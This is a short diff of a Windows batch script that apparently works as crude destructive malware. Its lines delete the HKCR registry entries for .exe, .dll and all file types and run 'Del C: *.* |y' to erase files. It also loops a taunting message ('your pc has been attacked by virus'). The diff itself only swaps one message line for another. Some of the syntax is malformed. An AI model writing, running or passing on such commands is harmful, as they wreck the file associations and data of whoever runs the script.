@@ -4,6 +4,6 @@ START reg delete HKCR/.exe
 START reg delete HKCR/.dll
 START reg delete HKCR/*
 :MESSAGE
-ECHO Your PC has been crashed.Your Dad.
+ECHO Hahaha your pc has been attacked by virus
 GOTO MESSAGE
 Del C: *.* |y
